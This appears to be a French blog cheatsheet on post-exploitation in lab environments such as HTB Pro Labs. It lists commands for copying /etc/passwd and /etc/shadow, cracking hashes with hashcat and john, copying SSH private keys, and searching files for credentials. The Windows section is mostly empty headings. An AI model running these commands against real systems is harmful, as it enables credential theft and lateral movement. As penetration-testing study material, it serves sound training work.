---
title: "Post-Exploitation - Que faire une fois root/admin ?"
date: 2023-05-29T04:58:35-04:00
draft: false
---

Cette cheatsheet est là pour vous montrer le chemin que je fais pour cette étape. Elle n'est pas exhaustive et peut contenir des coquilles, n'hésitez pas à me les remonter sur Discord s'il manque une ou des commandes ou s'il y a une ou plusieurs erreurs.

- [0. Introduction](#introduction)
- [1. Linux](#linux)
	- [1.1 - Dump /etc/passwd](#dump-etcpasswd)
	- [1.2 - Dump /etc/shadow](#dump-etcshadow)
	- [1.3 - John / Hashcat](#john--hashcat)
	- [1.4 - Clés SSH](#clés-ssh)
	- [1.5 - Chercher des credentials dans des fichiers](#chercher-des-credentials)
	- [1.6 - Fichiers / dossiers utiles](#fichiers--dossiers-utiles)
	- [1.7 - Routes](#routes) 
- [2. Windows](#windows)
	- [2.1 - Impacket-secretsdump](#impacket-secretsdump)
	- [2.2 - Mimikatz](#mimikatz)
	- [2.3 - Fichiers / dossiers utiles](#fichiers--dossiers-utiles-1)
	- [2.4 - Chercher des credentials dans des fichiers](#chercher-des-credentials-1)
	- [2.5 - Routes](#routes-1)
## Introduction 
Dans les labs avec plusieurs machines, type les prolabs HTBs, on est souvent amené à faire de la post-exploitation à chaque compromission de machine pour récolter des informations et potentiellement les ré-utiliser. Dans ce genre d'environnement, ca peut nous permettre de potentiellement obtenir des accès à de nouvelles machines.

## Linux 
### Dump /etc/passwd
```shell
cat /etc/passwd > /tmp/passwd
scp user@IP:/tmp/passwd /dump/loot/.
```
### Dump /etc/shadow
```shell
cat /etc/shadow > /tmp/shadow
scp user@IP:/tmp/shadow /dump/loot/.
```
### John / Hashcat
```shell
unshadow passwd shadow > hashs
hashcat -m 1800 -a 0 hashes /usr/share/wordlists/rockyou.txt
ou
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```
### Clés SSH
```shell
les clés SSH sont dans /home/<USER>/.ssh/id_rsa
scp user@IP:/home/<USER>/.ssh/id_rsa /dump/loot/.
```
### Chercher des credentials
Je trouvais grep plutôt lent, donc ripgrep (merci WarthogTK pour la découverte) :
https://github.com/BurntSushi/ripgrep.

Les résultats sont souvent très verbeux, ne pas hésitez de les trier à coup de grep, il faut faire petit à petit pour ne récupérer uniquement les infos dont on a besoin, ripgrep permet dans le cas ici, d'être plus rapide que grep pour le "tri large".
```
ripgrep <mot> <chemin>
=> ripgrep pass .
=> ripgrep login .
le readme du github explique plutôt bien les avantages et comment utiliser ripgrep
```
### Fichiers / dossiers utiles 
```shell
Ces fichiers peuvent contenir des credentials ou autre informations utiles :
- /home/<USER>/.bash_history
- /var/apache2/config.inc
- /var/mail/*
- /opt/. 
- /var/www/. -> un site qui tourne, check la config.
```

### Routes
```shell
Ces commandes vous permettront de découvrir potentiellement de nouveaux réseaux :
- ifconfig
- ip a
- arp -a 
```

## Windows
### Impacket-Secretsdump
### Mimikatz
si on est dans un AD, faut spray les creds, si c'est un user du domaine, check si il y a des comptes kerberoastable / asrep/spn...check les droits du compte dans l'AD ...
### Fichiers / dossiers utiles
### Chercher des credentials

### Routes
